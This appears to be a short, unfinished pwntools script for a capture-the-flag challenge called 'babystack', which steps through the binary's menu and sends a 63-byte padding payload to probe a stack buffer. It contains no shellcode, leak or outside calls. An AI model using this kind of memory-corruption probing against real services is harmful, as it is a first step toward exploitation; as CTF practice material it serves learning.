from pwn import *

io = process('./babystack')#, env={'LD_PRELOAD':'./libc_64.so.6'})

print(io.recv())
io.sendline('1')
print(io.recv())
io.sendline()
print(io.recv())
io.sendline('3')
print(io.recv())
payload = 'A'*63
pause()
io.sendline(payload)
print(io.recv())
io.sendline('3')
print(io.recv())
